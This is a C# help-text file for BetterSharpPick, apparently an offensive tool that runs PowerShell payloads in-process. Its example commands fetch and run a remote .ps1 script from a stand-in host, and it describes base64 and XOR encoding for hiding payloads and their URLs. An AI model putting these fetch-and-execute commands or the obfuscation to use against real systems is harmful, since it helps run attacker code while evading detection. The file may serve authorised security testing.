using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BetterSharpPick.Util
{
    public static class HelpText
    {
        public static void Print()
        {
            Console.WriteLine(@"
USAGE:
  BetterSharpPick [-xor <0-255>] [-path <file-or-url>] [-c <text>] [-arg <string>] [-b64] [-raw]

DESCRIPTION:
  -path <value>   : Payload file path or URL.
  -c <value>      : Inline PowerShell code.
  -arg <string>  : Argument to pass (repeatable).

  -b64            : Scoped base64. Applies ONLY to the NEXT option’s value.
                    Put -b64 directly before -path, -c, or -arg if that value is base64-encoded.
                    If -b64 is not used in front of an option, no base64 is expected for that option.

  -xor <0-255>    : Single decimal byte key. Applies ONLY to payloads from -path (file/URL).
                    Does NOT apply to -c or -arg.
                    If used together with -b64 (scoped to -path), decoding order is: Base64 → XOR.
  
  --raw, -raw     : Affects only the payload content read via -path.
                    Treat the -path payload as RAW text; do NOT apply Base64/XOR.
                    Does not affect -c or --arg.

EXAMPLES:
  BetterSharpPick -path https://example.com/file.ps1
  BetterSharpPick -b64 -c V3JpdGUtSG9zdCAnSGVsbG8n
  BetterSharpPick -b64 -arg UGFyYW0x -b64 -arg UGFyYW0y
  BetterSharpPick -xor 140 -b64 -path aHR0cHM6Ly9leGFtcGxlLmNvbS9maWxlLnBzMQ==
");
        }

    }
}